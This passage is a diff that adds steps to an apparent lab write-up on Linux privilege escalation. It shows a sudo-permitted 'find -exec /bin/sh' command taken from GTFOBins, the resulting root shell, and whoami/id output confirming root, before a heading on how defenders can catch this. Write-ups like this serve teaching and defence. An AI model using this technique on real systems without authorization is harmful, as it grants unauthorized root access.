@@ -162,17 +162,48 @@ From the list of binaries I could run as root, I chose find because it is one of
 I then went to GTFOBins and searched for find.
 The find page listed several functions, including Shell, File Write, SUID, and Sudo. Since I was allowed to run find with sudo, I opened the Sudo section to get the command needed to spawn a root shell.
 
+## Step 3 — Abusing find with Sudo to Get a Root Shell
 
+GTFOBins gave me the exact command for the Sudo function of find
 
+```bash
+find . -exec /bin/sh \; -quit
+```
 
+- `sudo find` : Runs `find` as **root** through the `sudo` `NOPASSWD` rule.
+- `.` : Searches in the current directory. 
+- `-exec /bin/sh \;` : Executes `/bin/sh` for the first file found. Since `find` is running as **root**, the shell also runs as **root**. 
+- `-quit` : Stops after the first match so `find` does not continue searching. S
 
+### Ran the Command
 
+```bash
+user@debian:~$ sudo find . -exec /bin/sh \; -quit
+```
+**Output:**
 
+```
+sh-4.1#
+```
+The prompt changed from user@debian to sh-4.1# — that # symbol confirms I was now root.
 
+## Step 4 — Confirming Full Root Access
+```bash
+sh-4.1# whoami
+```
+```
+root
+```
 
-
-
-
+```bash
+sh-4.1# id
+```
+```
+uid=0(root) gid=0(root) groups=0(root)
+```
+<p align="center">
+  <img src="images/step4-1.png" width="600">
+</p>
 
 
 ## ## How Defenders Can Catch This
